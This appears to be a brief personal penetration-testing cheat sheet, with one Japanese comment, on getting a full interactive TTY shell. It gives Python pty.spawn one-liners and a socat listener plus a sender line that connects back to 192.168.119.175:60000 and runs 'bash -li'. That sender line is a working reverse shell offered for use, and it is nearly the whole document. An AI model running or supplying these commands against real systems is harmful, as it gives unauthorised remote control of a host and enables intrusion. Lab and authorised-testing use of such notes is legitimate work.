# tty

### python

```bash
python* -c 'import pty; pty.spawn("/bin/sh")'
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

※*にはバージョンを入れる



### Socat

```bash
# listener
socat file:`tty`,raw,echo=0 tcp-listen:60000

# sender
socat TCP4:192.168.119.175:60000 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

